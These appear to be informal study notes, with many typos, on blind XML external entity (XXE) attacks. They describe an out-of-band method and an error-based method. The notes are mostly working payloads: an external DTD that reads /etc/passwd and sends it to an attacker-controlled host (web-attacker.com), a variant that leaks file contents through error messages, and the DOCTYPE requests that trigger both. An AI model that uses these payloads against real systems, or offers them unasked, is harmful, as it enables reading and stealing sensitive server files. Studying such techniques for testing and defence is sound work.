1. usn=ing an external DTD method ---> suppose we hosted an external DTD on a webserver that we can control 
Eg --> we can also do it localy using python server

so on the server we need to host something like this:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

once we have our malicious server setup we can request external entities like this 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

which can give us desired output
sometimes /etc/password may not work as it may have multiple lines with newline then we can use /etc/hostname wi=hich contains single lines

2.via error mesages
this method alsso uses external dtd to cause errror by storing inclusi=ding non existsnace file in xxe

eg:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">    -------> non existence file is used
%eval;
%exfil;

request:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
that should acuse some error which may give info disclosure
